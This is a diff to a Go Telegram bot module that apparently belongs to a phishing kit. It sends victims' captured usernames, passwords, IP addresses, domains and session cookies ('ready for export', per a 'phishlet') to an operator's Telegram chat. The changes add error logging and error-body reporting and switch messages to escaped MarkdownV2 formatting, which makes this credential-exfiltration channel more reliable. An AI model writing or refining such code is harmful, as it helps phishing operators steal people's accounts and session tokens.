@@ -84,13 +84,17 @@ func (t *TelegramBot) messageWorker() {
 		select {
 		case msg := <-t.msgQueue:
 			if msg != nil {
-				t.sendMessage(msg)
+				if err := t.sendMessage(msg); err != nil {
+					log.Error("telegram: failed to send message: %v", err)
+				}
 			}
 		case <-t.stopChan:
 			// Process remaining messages before stopping
 			for len(t.msgQueue) > 0 {
 				if msg := <-t.msgQueue; msg != nil {
-					t.sendMessage(msg)
+					if err := t.sendMessage(msg); err != nil {
+						log.Error("telegram: failed to send message on shutdown: %v", err)
+					}
 				}
 			}
 			return
@@ -123,7 +127,8 @@ func (t *TelegramBot) sendMessage(msg *TelegramMessage) error {
 	defer resp.Body.Close()
 
 	if resp.StatusCode != http.StatusOK {
-		return fmt.Errorf("telegram API returned status code: %d", resp.StatusCode)
+		errBody, _ := io.ReadAll(resp.Body)
+		return fmt.Errorf("telegram API returned status %d: %s", resp.StatusCode, string(errBody))
 	}
 
 	return nil
@@ -175,8 +180,8 @@ func (t *TelegramBot) SendFormattedSession(sessionID int, formattedMessage strin
 
 	msg := &TelegramMessage{
 		ChatID:    t.chatID,
-		Text:      formattedMessage,
-		ParseMode: "", // No markdown parsing for custom format
+		Text:      escapeMarkdownV2(formattedMessage),
+		ParseMode: "MarkdownV2", // Use MarkdownV2 so formatting is preserved cleanly
 	}
 
 	select {
@@ -201,7 +206,7 @@ func (t *TelegramBot) SendTokensCapture(sessionID int, username, password, ip, d
 			"🌐 *IP Address:* %s\n"+
 			"🔗 *Domain:* %s\n\n"+
 			"📝 *Note:* Cookies are attached and ready for export",
-		phishletName,
+		escapeMarkdownV2(phishletName),
 		cookieCount,
 		escapeMarkdownV2(username),
 		escapeMarkdownV2(password),
@@ -304,7 +309,8 @@ func (t *TelegramBot) SendDocument(filePath string, caption string) error {
 	defer resp.Body.Close()
 
 	if resp.StatusCode != http.StatusOK {
-		return fmt.Errorf("telegram API returned status code: %d", resp.StatusCode)
+		errBody, _ := io.ReadAll(resp.Body)
+		return fmt.Errorf("telegram API returned status %d: %s", resp.StatusCode, string(errBody))
 	}
 
 	// Clean up the temporary file after sending
